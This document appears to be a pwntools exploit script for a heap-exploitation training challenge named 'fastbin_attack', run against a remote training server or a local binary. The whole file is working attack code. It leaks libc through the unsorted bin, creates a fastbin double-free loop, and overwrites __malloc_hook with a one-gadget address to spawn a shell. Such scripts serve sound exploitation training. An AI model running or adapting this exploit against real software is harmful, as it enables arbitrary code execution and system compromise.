from pwn import *

context.update(arch='amd64', os='linux')
context.terminal=['tmux','splitw','-h']
context.log_level = 'debug'
libc = ELF("./libc-2.23.so")

if "REMOTE" in args:

    p=remote("bin.training.offdef.it", 10101)

else:
    p=process("./fastbin_attack")
    gdb.attach(p,"""
    #b* 0x00100a20
    
            """)

input("wait")


def alloc(size):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    p.recvuntil(b"Size: ")
    p.sendline(b"%d" % size)
    p.recvuntil(b"index ")
    return int(p.recvuntil("!")[:-1])


def write_chunk(index, content):
    p.recvuntil(b"> ")
    p.sendline(b"2")
    p.recvuntil(b"Index: ")
    p.sendline(b"%d" % index)
    p.recvuntil(b"Content: ")
    p.send(content)
    p.recvuntil(b"Done!\n")

def read_chunk(index):
    p.recvuntil(b"> ")
    p.sendline(b"3")
    p.recvuntil(b"Index: ")
    p.sendline(b"%d" % index)
    data = p.recvuntil(b"Options:\n")
    return data[:-len(b"Options:\n")]

def free_chunk(index):
    p.recvuntil(b"> ")
    p.sendline(b"4")
    p.recvuntil(b"Index: ")
    p.sendline(b"%d" % index)
    p.recvuntil(b"freed!\n")

chunk_a = alloc(0x100)  #we have to use a size greater than x90 to use the unsorted bin
chunk_b = alloc(0x20)   #we allocate two chunks since if it is only one it is merged with the top chunk
free_chunk(chunk_a)      # if we free the chunk, it goes in the unsorted bin, so we are able to read the backward pointer to libc.
libc_leak = u64(read_chunk(chunk_a)[:6]+b"\x00\x00")
log.debug(f'Il valore di my_variable è: {hex(libc_leak)}')
pause()
libc_base = libc_leak - 0x3c4b78      #offset between libc start address with vmmap(+x) and libc_leak
log.debug(f'Il valore di my_variable è: {hex(libc_base)}')
pause()
libc.address = libc_base
free_hook = libc.symbols["__free_hook"]   #in order to do libc.symbols you have to do libc.address = libc_base
malloc_hook = libc.symbols["__malloc_hook"]

target = malloc_hook - 0x23     #0x23 is the difference from the pointer of malloc_hook and the pointer of fastbin with metadata 7f

print("[!] libc_leak: %#x" % libc_leak)
print("[!] libc_base: %#x" % libc_base)
print("[!] free_hook: %#x" % free_hook)
print("[!] malloc_hook: %#x" % malloc_hook)
print("[!] target: %#x" % target)

SIZE = 0x60   #x60 is a specific size since we have created before malloc_hook a pointer 7f

#FASTBIN ATTACK
chunk_1 = alloc(SIZE) #we have to allocate two chunks and then freed them in a chain to obtain a loop 
chunk_2 = alloc(SIZE)


free_chunk(chunk_1)
free_chunk(chunk_2)    #obtain a loop 0x556dbdf14000 —▸ 0x556dbdf14070 ◂— 0x556dbdf14000
free_chunk(chunk_1)


chunk_A = alloc(SIZE)
write_chunk(chunk_A, p64(target))

input("wait")

chunk_B = alloc(SIZE)
chunk_C = alloc(SIZE) #qui fastbins 0x70: 0x7f1426bc4aed ◂— 0x1426885ea0000000


#overwrite malloc_hook
chunk_D = alloc(SIZE)  #qui 0x70: 0x1426885ea0000000
write_chunk(chunk_D, b"A"*0x13+p64(libc_base+0xf1247))    #one gadgets  x13 is the padding between malloc_hook and the fastbin                          


p.recvuntil(b"> ")      #we have to allocate in order to call the function that spawns shell
p.sendline(b"1")
p.recvuntil(b"Size: ")
p.sendline(b"%d" % 0x20)
                               #chunk_E= alloc(0x20) #this doesnt work i think because it spawns shell before i receive !

p.interactive()

#bins to see values of bins
#p &__malloc_hook to see address
#p &__free_hook 